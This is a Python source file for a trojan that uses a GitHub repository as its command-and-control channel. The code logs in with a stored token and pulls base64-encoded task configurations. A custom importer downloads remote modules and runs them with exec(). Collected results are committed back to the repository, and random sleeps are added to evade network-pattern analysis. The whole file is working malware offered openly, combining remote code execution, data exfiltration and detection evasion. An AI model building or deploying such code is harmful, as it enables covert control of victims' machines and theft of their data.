import base64
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

import github3

USER = "YOUR-USERNAME"
REPO = "YOUR-REPO-NAME"


def github_connect():
    """
    Connect to github and return a session from the remote repository.
    """
    with open('token.txt') as token_file:
        token = token_file.readline().strip()
    # session is a GitHub instance
    session = github3.login(token=token)
    return session.repository(USER, REPO)


def get_file_contents(dirname, filename, repo):
    """
    Get the contents of the specified file from the remote repository.
    [NOTE] The contents might be base64 encoded.
    """
    return repo.file_contents(f"{dirname}/{filename}").content


class Trojan:
    """A class represents a trojan."""

    def __init__(self, trojan_id):
        """Initialize a trojan."""
        self.trojan_id = trojan_id
        # the file to read the configuration from
        self.config_file = f"{trojan_id}.json"
        # the path to write the data to
        self.data_path = f"data/{trojan_id}"
        # create a session to the remote repository
        self.repo = github_connect()

    def get_config(self) -> dict:
        """
        Get the configuration from the remote repository.
        Return a dictionary of the configuration.
        """
        config_json = get_file_contents('config',
                                        self.config_file,
                                        self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            # sys.modules return all imported modules of the current session
            if task['module'] not in sys.modules:
                # import modules into the trojan object
                # including external and self-crafted modules.
                #
                # exec invokes Python interpreter to execute agiven code
                exec(f"import {task['module']}")
        return config

    def module_runner(self, module):
        """
        Call the *run* function from the module.
        Store the results of the run to the remote repository.
        """
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data: str):
        """Store the collected data to the remote repository."""
        # use the datetime value as the filename
        message = datetime.now().isoformat()
        remote_path = f"data/{self.trojan_id}/{message}.data"

        if not isinstance(data, str):
            data = str(data)
        try:
            bindata = bytes(data, 'utf-8')
            # the message from the create_file is the commit message
            self.repo.create_file(remote_path,
                                  message,
                                  base64.b64encode(bindata))
        except Exception as e:
            print(f"[x] Exception: {e}")

    def run(self):
        """Run all tasks from the configuration file."""
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner,
                                          args=(task['module'],))
                thread.start()
                # sleep in a random amount of time
                # to avoid network-pattern analysis
                time.sleep(random.randint(30*60, 3*60*60))


class GitImporter:
    """A class to handle importing self-crafted modules."""

    def __init__(self):
        self.current_module_code = ""
        self.repo = None

    def find_module(self, name, path=None):
        """
        A method for Python interpreter to
        find the module from the remote repository.
        """
        print(f"[+] Attempting to retrieve {name}.")
        self.repo = github_connect()

        new_lib = get_file_contents('modules', f'{name}.py', self.repo)
        if new_lib is not None:
            self.current_module_code = base64.b64decode(new_lib)
            # by returning self, python interpreter knows that the module was found
            # and it can call the load_module method.
            return self

    def load_module(self, name):
        """
        A method for Python interpreter to
        load module from the remote repository.
        """
        spec = importlib.util.spec_from_loader(name,
                                               loader=None,
                                               origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


if __name__ == '__main__':
    # if python interpreter fails to import a module,
    # it'll use the GitImporter to try to import modules from the remote repository.
    sys.meta_path.append(GitImporter())
    trojan = Trojan('test_trojan')
    trojan.run()
